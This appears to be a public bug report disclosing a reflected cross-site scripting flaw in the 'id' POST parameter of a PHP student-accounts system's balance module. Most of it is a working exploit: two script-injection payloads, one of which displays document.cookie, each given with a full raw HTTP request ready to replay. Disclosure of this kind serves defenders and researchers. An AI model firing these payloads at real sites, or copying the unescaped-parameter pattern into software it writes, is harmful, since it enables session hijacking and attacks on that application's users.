# Monitoring of Students Cyber Accounts System v1.0 has Cross-site scripting (reflected)

BUG_Author: Xue Yue

Website source address:https://www.sourcecodester.com/php/11743/monitoring-students-cyber-accounts.html

Vulnerability url: /MSCAB/modules/balance/index.php?view=balancelist

POST parameter 'id' exists XSS vulnerability

Payload1:id="><script>alert(111)</script>

```
POST /MSCAB/modules/balance/index.php?view=balancelist HTTP/1.1
Host: localhost
Content-Length: 50
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/MSCAB/modules/balance/index.php?view=balancelist
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=4ucuktra2adujlr277p85iuap1
Connection: close

id=%22%3E%3Cscript%3Ealert%28111%29%3C%2Fscript%3E
```

![image](https://github.com/xyaly163/bug_report/blob/main/picture/xss1.png)

Payload2:id="><script>alert(document.cookie)</script>

```
POST /MSCAB/modules/balance/index.php?view=balancelist HTTP/1.1
Host: localhost
Content-Length: 62
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/MSCAB/modules/balance/index.php?view=balancelist
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=4ucuktra2adujlr277p85iuap1
Connection: close

id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```

![image](https://github.com/xyaly163/bug_report/blob/main/picture/xss2.png)
